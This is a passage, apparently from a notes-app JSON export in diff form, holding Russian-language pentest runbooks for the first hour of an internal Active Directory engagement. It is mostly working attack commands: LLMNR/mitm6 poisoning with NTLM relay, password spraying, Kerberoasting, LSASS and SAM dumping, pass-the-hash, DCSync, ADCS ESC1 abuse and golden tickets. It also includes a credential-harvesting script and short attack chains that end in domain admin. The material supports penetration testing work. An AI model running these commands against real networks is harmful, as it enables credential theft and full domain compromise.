\"$CRED_PASS\" -M laps 2>&1 | tee laps_results.txt\n# Если читаем LAPS → local admin на хостах\n\n# 9. Shares с кредами (больше доступа)\nnetexec smb smb_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" --shares 2>&1 | \\\n    grep -E \"READ|WRITE\" | tee cred_shares.txt\n# Spider\nnetexec smb smb_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" -M spider_plus \\\n    -o DOWNLOAD_FLAG=false OUTPUT_FOLDER=./spider_cred/ 2>&1\n\n# 10. Password policy → aggressive spray\nnetexec smb $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --pass-pol 2>&1 | tee pass_policy_full.txt\n\n# 11. Все доменные юзеры\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --users 2>&1 | tee all_domain_users.txt\n# Парсим для spray\nawk '{print $5}' all_domain_users.txt | grep -v \"^\\s*$\" | sort -u > full_user_list.txt\n\n# 12. Пароли в description (с кредами видим всех)\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" \\\n    -M get-desc-users 2>&1 | tee descriptions.txt\ngrep -iE \"pass|pwd|пароль|cred|secret|temp|logon\" descriptions.txt\n\n# 13. noPac / sAMAccountName spoofing\nnetexec smb $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M nopac 2>&1\n\n# 14. PrintNightmare\nnetexec smb smb_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" -M printnightmare 2>&1\n\n# 15. MSSQL с доменными кредами\nnetexec mssql db_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" -d $DOMAIN 2>&1 | tee mssql_domain_auth.txt\n# Если sysadmin → xp_cmdshell\n5.3. Если получили local admin на хосте\nBash\n\nTARGET_IP=\"10.10.10.X\"\n\n# Dump SAM + LSA + DPAPI\nnetexec smb $TARGET_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --sam 2>&1 | tee sam_dump.txt\nnetexec smb $TARGET_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --lsa 2>&1 | tee lsa_dump.txt\nnetexec smb $TARGET_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --dpapi 2>&1 | tee dpapi_dump.txt\n\n# Dump LSASS (осторожно — AV может блокировать)\nnetexec smb $TARGET_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M lsassy 2>&1 | tee lsassy_dump.txt\nnetexec smb $TARGET_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M nanodump 2>&1 | tee nanodump.txt\nnetexec smb $TARGET_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M handlekatz 2>&1\n\n# Logged on users / sessions\nnetexec smb $TARGET_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --loggedon-users 2>&1\n\n# Если нашли NTLM hash DA → game over\ngrep -iE \"administrator|domain admin\" sam_dump.txt lsa_dump.txt lsassy_dump.txt 2>/dev/null\n\n# Pass-the-hash с найденными хешами\nFOUND_HASH=\"aad3b435...:abcdef...\"\nnetexec smb smb_hosts.txt -u \"Administrator\" -H \"$FOUND_HASH\" 2>&1 | grep \"Pwn3d\"\nnetexec smb $DC_IP -u \"Administrator\" -H \"$FOUND_HASH\" 2>&1 | grep \"Pwn3d\"\n# Если Pwn3d на DC → DCSync\nimpacket-secretsdump \"$DOMAIN/Administrator@$DC_IP\" -hashes \"$FOUND_HASH\" 2>&1 | tee dcsync.txt\nPHASE 6: РЕАЛЬНЫЕ КЕЙСЫ (ЧАСТЫЕ WINS)\nКейс 1: Relay Chain\ntext\n\n1. Responder поймал NTLMv2 hash от user1 (через LLMNR poisoning)\n2. hashcat -m 5600 → пароль \"Company2024!\"\n3. Проверяем shares → SYSVOL/script.bat содержит пароль svc_backup\n4. svc_backup → member of Backup Operators\n5. Backup Operators → SAM/SYSTEM dump с DC через reg save\n6. → DA hash → DCSync\nВремя: 25 минут\nКейс 2: mitm6 → DA за 10 минут\ntext\n\n1. mitm6 отравляет DHCPv6\n2. Machine account DESKTOP-ABC$ аутентифицируется на наш relay\n3. ntlmrelayx создаёт computer account FAKEMACHINE$\n4. RBCD: FAKEMACHINE$ → impersonate Administrator на DESKTOP-ABC$\n5. secretsdump на DESKTOP-ABC$ → cached DA creds\n6. → DA\nВремя: 10-15 минут\nКейс 3: ADCS ESC1\ntext\n\n1. Spray: user1:Password1\n2. certipy find → ESC1 на шаблоне \"User\"\n3. certipy req -u user1 -p Password1 -target ca.corp.local -template User -upn administrator@corp.local\n4. certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1\n5. → DA NT hash → DCSync\nВремя: 15 минут после получения кредов\nКейс 4: NFS → SSH → AD\ntext\n\n1. showmount -e 10.10.10.50 → /home (everyone)\n2. mount → /home/admin/.ssh/id_rsa\n3. SSH на 10.10.10.50 как admin\n4. cat /etc/krb5.keytab → machine account hash\n5. → LDAP query → кредов в description\n6. → spray → local admin → LSASS dump → DA\nВремя: 20 минут\nКейс 5: Password in description\ntext\n\n1. ldapsearch anonymous bind → 500 users\n2. grep \"description:\" → \"Temp password: Welcome2024!\"\n3. user svc_sql → Kerberoast → TGS hash\n4. hashcat → another svc password\n5. svc account → local admin → chain → DA\nВремя: 15 минут\nPHASE 7: MASTER CHECKLIST\ntext\n\n╔═══════════════════════════════════════════════════════════╗\n║              INTERNAL PENTEST — HOUR 1 CHECKLIST          ║\n╠═══════════════════════════════════════════════════════════╣\n║                                                           ║\n║  [T=0min] ЗАПУСК ПАРАЛЛЕЛЬНЫХ ПРОЦЕССОВ                   ║\n║  ────────────────────────────────────────                  ║\n║  □ Responder -I eth0 ...                                  ║\n║  □ mitm6 + ntlmrelayx                                     ║\n║  □ masscan quick ports                                    ║\n║  □ nmap top-100                                           ║\n║  □ nmap full (background)                                 ║\n║  □ Network recon (IP, DNS, DC)                            ║\n║                                                           ║\n║  [T=3min] ПОСЛЕ MASSCAN                                  ║\n║  ─────────────────────                                    ║\n║  □ Парсинг в категории (smb/rdp/web/db/etc)              ║\n║  □ SMB signing check → relay_targets.txt                  ║\n║  □ Null session / Guest на SMB                            ║\n║  □ RID brute                                              ║\n║  □ LDAP anonymous bind                                    ║\n║  □ enum4linux-ng (background)                             ║\n║  □ MS17-010 check на legacy                               ║\n║  □ ZeroLogon check                                        ║\n║  □ PetitPotam check                                       ║\n║  □ MSSQL default creds                                    ║\n║  □ FTP anonymous                                          ║\n║  □ NFS exports                                            ║\n║                                                           ║\n║  [T=10min] ПОСЛЕ ПОЛУЧЕНИЯ СПИСКА ЮЗЕРОВ                 ║\n║  ──────────────────────────────────────                    ║\n║  □ AS-REP Roasting                                        ║\n║  □ Password spray (username=password)                     ║\n║  □ Password spray (сезонные/типичные)                     ║\n║  □ Kerbrute enum (если нет юзеров)                        ║\n║                                                           ║\n║  [T=15min] ПОСЛЕ NMAP TOP-100                             ║\n║  ─────────────────────────────                             ║\n║  □ Анализ nmap output (legacy, versions, rare ports)      ║\n║  □ Web fingerprinting (httpx/nuclei)                      ║\n║  □ Default creds на web (Jenkins/Tomcat/etc)              ║\n║  □ Скриншоты (gowitness/eyewitness)                       ║\n║  □ SNMP community brute                                   ║\n║  □ Telnet banners                                         ║\n║  □ Redis/MongoDB/Elastic без auth                         ║\n║  □ IPMI check                                             ║\n║                                                           ║\n║  [T=30min] ПОСЛЕ ПОЛУЧЕНИЯ ПЕРВЫХ КРЕДОВ                  ║\n║  ─────────────────────────────────────                     ║\n║  □ Kerberoasting                                          ║\n║  □ BloodHound collection                                  ║\n║  □ Check local admin on all hosts                         ║\n║  □ ADCS enumeration (certipy)                             ║\n║  □ Delegation check                                       ║\n║  □ GPP passwords                                          ║\n║  □ LAPS read                                              ║\n║  □ Shares spider with creds                               ║\n║  □ MSSQL with domain creds                                ║\n║  □ noPac check                                            ║\n║  □ PrintNightmare check                                   ║\n║  □ Description passwords (all users)                      ║\n║  □ Aggressive spray with known policy                     ║\n║                                                           ║\n║  [T=45min] ЕСЛИ ПОЛУЧИЛИ LOCAL ADMIN                      ║\n║  ─────────────────────────────────                         ║\n║  □ SAM dump                                               ║\n║  □ LSA dump                                               ║\n║  □ LSASS dump (lsassy/nanodump/handlekatz)                ║\n║  □ DPAPI                                                  ║\n║  □ Pass-the-hash spray                                    ║\n║  □ Lateral movement → repeat                              ║\n║                                                           ║\n║  [CONTINUOUS] ВСЁ ВРЕМЯ                                   ║\n║  ──────────────────────                                    ║\n║  □ Мониторь Responder (новые хеши → hashcat)              ║\n║  □ Мониторь mitm6/ntlmrelayx (auth events)               ║\n║  □ hashcat на все полученные хеши                          ║\n║  □ Проверяй spray results                                 ║\n║  □ Обновляй списки: users, creds, hosts                   ║\n║                                                           ║\n╠═══════════════════════════════════════════════════════════╣\n║  DA ПОЛУЧЕН:                                              ║\n║  □ DCSync (impacket-secretsdump)                          ║\n║  □ Дамп NTDS.dit                                          ║\n║  □ Golden ticket (для persistence в отчёте)               ║\n║  □ Документируй chain of compromise                       ║\n╚═══════════════════════════════════════════════════════════╝\nДОПОЛНЕНИЯ / TIPS\nHashcat — правильные режимы\nBash\n\n# NTLMv2 (Responder)\nhashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule --force -O\n\n# NTLMv1 (если --lm в Responder)\nhashcat -m 5500 hashes.txt wordlist.txt --force -O\n# Или crack.sh для rainbow tables (NTLMv1 = instant crack)\n\n# AS-REP\nhashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule --force -O\n\n# Kerberoast (TGS-REP etype 23)\nhashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule --force -O\n\n# Kerberoast (TGS-REP etype 17/18 — AES)\nhashcat -m 19600 kerberoast_aes128.txt wordlist.txt --force  # etype 17\nhashcat -m 19700 kerberoast_aes256.txt wordlist.txt --force  # etype 18\n\n# NetNTLMv1 → отправляй на https://crack.sh (бесплатно, rainbow tables)\n# Для этого используй --lm и --disable-ess в Responder\n\n# DPAPI masterkey\nhashcat -m 15900 dpapi.txt wordlist.txt --force\n\n# Local NTLM hash (SAM dump)\nhashcat -m 1000 ntlm.txt wordlist.txt -r rules/best64.rule --force -O\nОрганизация рабочего пространства\nBash\n\n# Структура проекта\nmkdir -p ~/pentest/{scans,creds,loot,tools,notes,bloodhound}\ncd ~/pentest\n\n# Логируй ВСЁ\nscript -a ~/pentest/notes/terminal_$(date +%Y%m%d_%H%M%S).log\n\n# tmux layout для пентеста\n# Window 1: Responder + mitm6\n# Window 2: Scans (nmap, masscan)\n# Window 3: AD attacks (netexec, impacket)\n# Window 4: Web attacks\n# Window 5: hashcat\n# Window 6: Notes / creds tracking\n\n# Трекинг кредов (обновляй постоянно)\necho \"user:password:source:access_level\" > ~/pentest/creds/creds_master.csv\n# Пример:\n# svc_sql:Summer2024!:spray:domain_user\n# Administrator:aad3b435...:31d6cfe...:sam_dump_HOST01:local_admin",
+      "tags": [],
+      "isFavorite": false,
+      "order": "4",
+      "createdAt": "2026-03-25T07:22:36.857Z",
+      "updatedAt": "2026-04-01T08:51:45.342Z",
+      "type": "notes"
+    },
+    {
+      "id": "0x95kh5zhmnongfa2",
+      "folderId": "4qpd3cjewmn1qgdjc",
+      "title": "Добавить",
+      "content": "петитпотам\nкорсы\nдобавить репозиторий с файлами",
+      "tags": [],
+      "isFavorite": false,
+      "order": "5",
+      "createdAt": "2026-04-07T13:23:09.530Z",
+      "updatedAt": "2026-04-07T13:23:36.381Z",
+      "type": "notes"
+    },
+    {
+      "id": "vk84078zdmn1qfgc5",
+      "folderId": "4qpd3cjewmn1qgdjc",
+      "title": "Пентест первый час",
+      "content": "Терминал 1 — Responder\n```bash\nresponder -I eth0 -b -d -w -F --lm --disable-ess\n```\n*в соседнем еще это запустить ---разобраться что это\n\n# mitm6 (часто забывают, а это instant win)\n\n# Терминал A: mitm6\n```bash\nmitm6 -d $DOMAIN --ignore-nofqdn\n```\n# Терминал B: ntlmrelayx с LDAP relay на DC\n```bash\nimpacket-ntlmrelayx -6 -t ldaps://$DC_IP -wh wpad --delegate-access --add-computer\n```\n\n# Или для создания нового юзера (лучше это):\n```bash\nimpacket-ntlmrelayx -6 -t ldaps://$DC_IP -wh wpad -l loot --add-computer\n\n# Результат: через 5-10 минут может прилететь auth от машины \n# → создаётся computer account → RBCD → DA\n```\n\nТерминал 2 — Masscan: быстрый поиск ключевых портов\n```bash\n# Находим живые хосты с критичными сервисами за 2-3 минуты\nmasscan -iL scope.txt -p 445,139,88,389,636,3389,5985,5986,80,443,8080,8443,21,22,23,25,53,111,135,1433,3306,5432,6379,27017,9200,8000,8888,2049 --rate 2000 -oL masscan_quick.txt\n```\n```bash\n# Парсинг результатов masscan в удобный формат\ngrep \"^open\" masscan_quick.txt | awk '{print $4}' | sort -u > live_hosts.txt\ngrep \"^open\" masscan_quick.txt | grep \" 445 \" | awk '{print $4}' | sort -u > smb_hosts.txt\ngrep \"^open\" masscan_quick.txt | grep \" 88 \"  | awk '{print $4}' | sort -u > kerberos_hosts.txt\ngrep \"^open\" masscan_quick.txt | grep \" 389 \" | awk '{print $4}' | sort -u > ldap_hosts.txt\ngrep \"^open\" masscan_quick.txt | grep \" 3389 \" | awk '{print $4}' | sort -u > rdp_hosts.txt\ngrep \"^open\" masscan_quick.txt | grep \" 5985 \" | awk '{print $4}' | sort -u > winrm_hosts.txt\ngrep \"^open\" masscan_quick.txt | grep -E \" (80|443|8080|8443) \" | awk '{print $4}' | sort -u > web_hosts.txt\ngrep \"^open\" masscan_quick.txt | grep -E \" (1433|3306|5432) \" | awk '{print $4}' | sort -u > db_hosts.txt\ngrep \"^open\" masscan_quick.txt | grep \" 21 \" | awk '{print $4}' | sort -u > ftp_hosts.txt\n```\nТерминал 3 — nmap top-100\n```bash\nnmap -iL scope.txt --top-ports 100  -sV --version-all -Pn -A -v -T4  -oA new_project_top100\n```\nТерминал 4 — nmap full\n```bash\nnmap -iL scope.txt -p-  -sV --script=vuln --version-all -Pn -A -v -T4  -oA new_project_all_ports\n```\n# Терминал 5 — Определяем свою сеть и ищем DC *\n```bash\n# Узнаём свой IP, шлюз, DNS\nip a show eth0\nip route\ncat /etc/resolv.conf\n\n# Ищем DC через DNS (быстрее всего)\nnslookup -type=srv _ldap._tcp.dc._msdcs.$(dnsdomainname) 2>/dev/null\nnslookup -type=srv _kerberos._tcp.$(dnsdomainname) 2>/dev/null\nnslookup -type=any _ldap._tcp.dc._msdcs. $(grep search /etc/resolv.conf | awk '{print $2}')\n\n# Или через DHCP-полученный DNS\nDNS_SERVER=$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}')\nnslookup -type=srv _ldap._tcp.dc._msdcs. $DNS_SERVER\ndig @$DNS_SERVER _ldap._tcp.dc._msdcs. -t SRV\ndig @$DNS_SERVER _gc._tcp. -t SRV\n\n# Быстрый способ найти домен\nnbtscan -r $(ip route | grep \"src\" | head -1 | awk '{print $1}')\n```\n\n# Первичная разведка AD и SMB\nКак только masscan дал результаты — сразу в дело\nОпределяем контроллер домена и домен\n```bash\nDC_IP=$(cat kerberos_hosts.txt | head -1)\necho \"DC IP: $DC_IP\"\n\n# Получаем имя домена\nnetexec smb $DC_IP\n\n\n# Вывод покажет: [*] Windows Server ... (domain:CORP.LOCAL) (signing:True)\n```\n```bash\n# Сохраняем домен\nDOMAIN=\"corp.local\"  # подставить из вывода выше\nDC_HOSTNAME=\"DC01\"   # подставить из вывода выше\n\nNULL-session атаки на SMB (без кредов)\n# Перебираем все SMB-хосты на null session\nnetexec smb smb_hosts.txt -u '' -p '' --shares 2>&1 | tee smb_null_shares.txt\nnetexec smb smb_hosts.txt -u 'guest' -p '' --shares 2>&1 | tee smb_guest_shares.txt\n\n# Ищем читаемые шары\nnetexec smb smb_hosts.txt -u '' -p '' --shares | grep -i \"READ\"\nnetexec smb smb_hosts.txt -u 'guest' -p '' --shares | grep -i \"READ\"\n\n# Пробуем анонимное перечисление пользователей\nnetexec smb $DC_IP -u '' -p '' --users 2>&1 | tee smb_null_users.txt\nnetexec smb $DC_IP -u '' -p '' --groups 2>&1 | tee smb_null_groups.txt\nnetexec smb $DC_IP -u 'guest' -p '' --users 2>&1 | tee smb_guest_users.txt\n\n# RID brute через null session (часто работает!)\nnetexec smb $DC_IP -u '' -p '' --rid-brute 10000 2>&1 | tee rid_brute.txt\n#or\nnetexec smb $DC_IP -u 'guest' -p '' --rid-brute 10000 2>&1 | tee rid_brute.txt\n# Парсим юзернеймы\ngrep \"SidTypeUser\" rid_brute.txt | awk -F'\\\\\\\\' '{print $2}' | awk '{print $1}' | sort -u > domain_users.txt\n\nLDAP anonymous bind\n# Анонимный LDAP-запрос\nldapsearch -x -H ldap://$DC_IP -b \"\" -s base namingContexts\nldapsearch -x -H ldap://$DC_IP -b \"DC=$(echo $DOMAIN | sed 's/\\./,DC=/g')\" -s sub \"(objectClass=user)\" sAMAccountName 2>&1 | tee ldap_anon_users.txt\nldapsearch -x -H ldap://$DC_IP -b \"DC=$(echo $DOMAIN | sed 's/\\./,DC=/g')\" -s sub \"(objectClass=computer)\" cn 2>&1 | tee ldap_anon_computers.txt\n\n# Если анонимный bind работает — вытягиваем всё\nldapsearch -x -H ldap://$DC_IP -b \"DC=$(echo $DOMAIN | sed 's/\\./,DC=/g')\" \"(objectClass=user)\" sAMAccountName userPrincipalName description memberOf 2>&1 | tee ldap_full_dump.txt\n\n# Ищем пароли в description (классика!)\ngrep -i -A2 -B2 \"description:\" ldap_full_dump.txt | grep -iE \"pass|pwd|пароль|cred|secret\"\n\nenum4linux-ng (параллельно)\nenum4linux-ng -A $DC_IP -oA enum4linux_dc 2>&1 &\n# Если есть время — по каждому SMB хосту\nfor ip in $(cat smb_hosts.txt); do\n    enum4linux-ng -A $ip -oA enum4linux_$ip 2>&1 &\ndone\n\n\n# rpcclient — null session\n\nrpcclient -U \"\" -N $DC_IP -c \"enumdomusers\" 2>&1 | tee rpc_users.txt\nrpcclient -U \"\" -N $DC_IP -c \"enumdomgroups\"\nrpcclient -U \"\" -N $DC_IP -c \"querydispinfo\"\nrpcclient -U \"\" -N $DC_IP -c \"querydominfo\"\nrpcclient -U \"\" -N $DC_IP -c \"netshareenumall\"\n# Пароли в описаниях\nrpcclient -U \"\" -N $DC_IP -c \"querydispinfo\" | grep -iE \"pass|pwd\"\n\nАтаки на получение кредов\nAS-REP Roasting (не нужны креды, нужен список юзеров!)\n\nПолучаем список юзеров через Kerbrute\nkerbrute userenum --dc $DC_IP -d $DOMAIN users_for_kerbrute.txt -o kerbrute_valid_users.txt\n\n# Парсим валидных юзеров\ngrep \"VALID\" kerbrute_output.txt | awk '{print $NF}' | sed 's/@.*//' > valid_kerb_users.txt\n\n\nimpacket-GetNPUsers \"$DOMAIN/\" -dc-ip $DC_IP -usersfile valid_kerb_users.txt -format hashcat -outputfile asrep_hashes.txt\n\n# Password spray через kerbrute (осторожно с lockout!)\n# Сначала проверяем политику\nnetexec smb $DC_IP -u '' -p '' --pass-pol\n# Если lockout threshold >= 5:\nkerbrute passwordspray --dc $DC_IP -d $DOMAIN valid_kerb_users.txt 'Password1' \nkerbrute passwordspray --dc $DC_IP -d $DOMAIN valid_kerb_users.txt 'Welcome1'\nkerbrute passwordspray --dc $DC_IP -d $DOMAIN valid_kerb_users.txt \"${DOMAIN%%.*}2024\"\nkerbrute passwordspray --dc $DC_IP -d $DOMAIN valid_kerb_users.txt 'Qwerty123'\nkerbrute passwordspray --dc $DC_IP -d $DOMAIN valid_kerb_users.txt 'P@ssw0rd'\n\nSMB signing disabled — Relay-атаки \n\n# Проверяем SMB signing (если disabled — можно relay)\nnetexec smb smb_hosts.txt --gen-relay-list relay_targets.txt\ncat relay_targets.txt\n# Если есть хосты без signing — запускаем ntlmrelayx\n# (responder уже ловит хеши, но для relay нужно отключить HTTP/SMB в responder)\n# В /etc/responder/Responder.conf:  SMB = Off, HTTP = Off\n# Затем:\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks 2>&1 | tee relay_output.txt\n# Или для мгновенного дампа SAM:\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support 2>&1 | tee relay_sam_dump.txt\n\nИщем открытые SMB-шары (spider)\n\n# Spider по всем шарам (ищем файлы с паролями)\nnetexec smb smb_hosts.txt -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=false OUTPUT_FOLDER=spider_results/\nnetexec smb smb_hosts.txt -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=false OUTPUT_FOLDER=spider_guest/\n\n# Ищем интересные файлы\nfind spider_results/ -name \"*.json\" -exec grep -liE \"\\.xml|\\.config|\\.ini|\\.txt|\\.bat|\\.ps1|\\.vbs|\\.kdbx|\\.xlsx|password|unattend|sysprep|\\.vmdk\" {} \\;\n\n# smbclient для ручного просмотра\nsmbclient -N -L //$DC_IP/ 2>&1 | tee smbclient_shares.txt\n# Для каждой шары\nsmbclient -N //$DC_IP/NETLOGON -c \"ls\" 2>&1\nsmbclient -N //$DC_IP/SYSVOL -c \"recurse;ls\" 2>&1\n```\n\n# -----Если получили первые креды-----\n```bash\nCRED_USER=\"found_user\"\nCRED_PASS=\"found_password\"\n\n# Проверяем креды\nnetexec smb $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\"\n\n# Дампим LDAP с кредами\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --users 2>&1 | tee cred_users.txt\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --groups 2>&1 | tee cred_groups.txt\n\n# Kerberoasting (нужны любые валидные креды!)\nimpacket-GetUserSPNs \"$DOMAIN/$CRED_USER:$CRED_PASS\" -dc-ip $DC_IP -outputfile kerberoast_hashes.txt\n# Крутим TGS хеши\nhashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force\n\n# BloodHound — собираем граф AD\nbloodhound-ce-python -u \"$CRED_USER\" -p \"$CRED_PASS\" -d $DOMAIN -dc $DC_HOSTNAME.$DOMAIN -c all --zip -ns $DC_IP\n# Или\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M bloodhound -o COLLECTION=all,OUTPUTPREFIX=bh\n\n# Проверяем доступ к шарам\nnetexec smb smb_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" --shares 2>&1 | tee cred_shares.txt\ngrep \"READ\" cred_shares.txt\n\n# Проверяем local admin access\nnetexec smb smb_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" 2>&1 | grep \"Pwn3d\"\nnetexec winrm winrm_hosts.txt -u \"$CRED_USER\" -p \"$CRED_PASS\" 2>&1 | grep \"Pwn3d\"\n\n# Дампим GPP-пароли (Group Policy Preferences)\nimpacket-Get-GPPPassword \"$DOMAIN/$CRED_USER:$CRED_PASS@$DC_IP\"\nnetexec smb $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M gpp_password\nnetexec smb $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M gpp_autologin\n\n# Проверяем LAPS\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M laps\n\n# Ищем ADCS (Active Directory Certificate Services)\nnetexec ldap $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" -M adcs\ncertipy find -u \"$CRED_USER@$DOMAIN\" -p \"$CRED_PASS\" -dc-ip $DC_IP -vulnerable -stdout 2>&1 | tee certipy_output.txt\n\n# Ищем делегирование\nimpacket-findDelegation \"$DOMAIN/$CRED_USER:$CRED_PASS\" -dc-ip $DC_IP\n\n# Password spray с большей уверенностью (знаем политику)\nnetexec smb $DC_IP -u \"$CRED_USER\" -p \"$CRED_PASS\" --pass-pol\n# spray: username=password\nnetexec smb $DC_IP -u domain_users.txt -p domain_users.txt --no-bruteforce --continue-on-success 2>&1 | tee spray_user_eq_pass.txt\n```\n\n\n# Если получили NTLM-хеш (вместо пароля)\n```bash\nCRED_HASH=\"aad3b435b51404eeaad3b435b51404ee:da39a3ee5e6b4b0d3255bfef95601890\"\n\n# Pass-the-hash\nnetexec smb smb_hosts.txt -u \"Administrator\" -H \"$CRED_HASH\" 2>&1 | grep \"Pwn3d\"\nimpacket-psexec \"$DOMAIN/Administrator@TARGET_IP\" -hashes \"$CRED_HASH\"\nimpacket-wmiexec \"$DOMAIN/Administrator@TARGET_IP\" -hashes \"$CRED_HASH\"\nimpacket-smbexec \"$DOMAIN/Administrator@TARGET_IP\" -hashes \"$CRED_HASH\"\nevil-winrm -i TARGET_IP -u Administrator -H \"$(echo $CRED_HASH | cut -d: -f2)\"\n```\n\n# Поиск уязвимых сервисов  (пока nmap ещё сканит) \n```bash\nдо кредов:\n\n# Проверяем MS17-010 (EternalBlue)\nnetexec smb smb_hosts.txt -M ms17-010 2>&1 | tee ms17010_check.txt\n\n# Проверяем ZeroLogon\nnetexec smb $DC_IP -M zerologon 2>&1 | tee zerologon_check.txt\n\n# Проверяем smbghost (SMBv3 compression)\nnetexec smb smb_hosts.txt -M smbghost 2>&1 | tee smbghost_check.txt\n\n# Проверяем PetitPotam (без кредов)\nnetexec smb $DC_IP -M petitpotam 2>&1 | tee petitpotam_check.txt\n\n# Coerce-атаки\nnetexec smb smb_hosts.txt -M coerce_plus 2>&1 | tee coerce_check.txt\n\nДелаем ПОСЛЕ получения любых кредов обычного юзера:\n\n# Проверяем PrintNightmare\nnetexec smb smb_hosts.txt -M printnightmare 2>&1 | tee printnightmare_check.txt\n\n# Проверяем noPac / sAMAccountName\nnetexec smb $DC_IP -M nopac -u \"$CRED_USER\" -p \"$CRED_PASS\" 2>&1\n\n\n# WebDAV enabled (для relay)\nnetexec smb smb_hosts.txt -M webdav 2>&1 | tee webdav_check.txt\n```\n\n\n\n# Проверяем другие сервисы:\n```bash\n# FTP anonymous\nfor ip in $(cat ftp_hosts.txt); do\n    echo \"--- $ip ---\"\n    curl -s --connect-timeout 3 ftp://$ip/ 2>&1 | head -20\n    echo \"\"\ndone\n\n# MSSQL default/weak creds\nnetexec mssql db_hosts.txt -u sa -p '' 2>&1 | tee mssql_nologin.txt\nnetexec mssql db_hosts.txt -u sa -p 'sa' 2>&1 | tee mssql_sa.txt\nnetexec mssql db_hosts.txt -u sa -p 'Password1' 2>&1\n\n# IPMI hash dump (если есть 623/udp)\nmasscan -iL scope.txt -pU:623 --rate 3000 -oL ipmi_hosts.txt\n# Для каждого IPMI хоста\nipmitool -I lanplus -H TARGET_IP -U '' -P '' user list\nimpacket-GetNPUsers # для IPMI cipher zero\n\n# Redis без пароля\nfor ip in $(grep \" 6379 \" masscan_quick.txt | awk '{print $4}'); do\n    redis-cli -h $ip INFO server 2>&1 | head -5\ndone\n\n# MongoDB без аутентификации\nfor ip in $(grep \" 27017 \" masscan_quick.txt | awk '{print $4}'); do\n    mongosh --host $ip --eval \"db.adminCommand('listDatabases')\" 2>&1 | head -10\ndone\n\nВеб-сервисы — быстрый чек\n\n# Скриншоты всех веб-сервисов\ncat web_hosts.txt | while read ip; do\n    echo \"http://$ip\"\n    echo \"https://$ip\"\ndone > web_urls.txt\ngowitness file -f web_urls.txt -P screenshots/ --timeout 10\n\n# Или EyeWitness\neyewitness --web -f web_urls.txt --timeout 10 -d eyewitness_report\n\n# Ищем IIS, Tomcat, Jenkins, и т.д.\nhttpx -l web_urls.txt -title -status-code -tech-detect -o httpx_results.txt 2>&1\ngrep -iE \"tomcat|jenkins|gitlab|jboss|weblogic|exchange|owa|adfs|printer|ilo|idrac\" httpx_results.txt\n```\n\n\n# ----скрипт после получения первых кредов----\n```bash\n#!/bin/bash\n# === WITH_CREDS.sh ===\nDC_IP=\"10.10.10.1\"\nDOMAIN=\"corp.local\"\nUSER=\"found_user\"\nPASS=\"found_password\"\n\necho \"[*] Validating creds\"\nnetexec smb $DC_IP -u \"$USER\" -p \"$PASS\"\n\necho \"[*] Kerberoast\"\nimpacket-GetUserSPNs \"$DOMAIN/$USER:$PASS\" -dc-ip $DC_IP -outputfile kerberoast.txt\n\necho \"[*] BloodHound collection\"\nbloodhound-ce-python -u \"$USER\" -p \"$PASS\" -d $DOMAIN -dc $DC_IP -c all --zip -ns $DC_IP\n\necho \"[*] GPP passwords\"\nnetexec smb $DC_IP -u \"$USER\" -p \"$PASS\" -M gpp_password\nnetexec smb $DC_IP -u \"$USER\" -p \"$PASS\" -M gpp_autologin\n\necho \"[*] ADCS vulns\"\ncertipy find -u \"$USER@$DOMAIN\" -p \"$PASS\" -dc-ip $DC_IP -vulnerable -stdout\n\necho \"[*] LAPS\"\nnetexec ldap $DC_IP -u \"$USER\" -p \"$PASS\" -M laps\n\necho \"[*] Delegation\"\nimpacket-findDelegation \"$DOMAIN/$USER:$PASS\" -dc-ip $DC_IP\n\necho \"[*] Shares with creds\"\nnetexec smb smb_hosts.txt -u \"$USER\" -p \"$PASS\" --shares 2>&1 | tee cred_shares.txt\n\necho \"[*] Local admin check\"\nnetexec smb smb_hosts.txt -u \"$USER\" -p \"$PASS\" 2>&1 | grep \"Pwn3d\" | tee pwned_hosts.txt\n\necho \"[*] Spider shares for juicy files\"\nnetexec smb smb_hosts.txt -u \"$USER\" -p \"$PASS\" -M spider_plus -o DOWNLOAD_FLAG=false\n```\n\n## QUICK REFERENCE: ПОРТ → ДЕЙСТВИЕ\n\n|Порт|Сервис|Первое действие|\n|---|---|---|\n|21|FTP|`ftp anonymous@IP` / `nmap --script ftp-anon`|\n|22|SSH|Позже brute / banner grab для версии|\n|25|SMTP|`smtp-user-enum -M VRFY -U users.txt -t IP`|\n|53|DNS|`dig axfr @IP domain.local` (zone transfer)|\n|80/443|HTTP|`whatweb`/`httpx`/`gowitness` → default creds|\n|88|Kerberos|DC! → 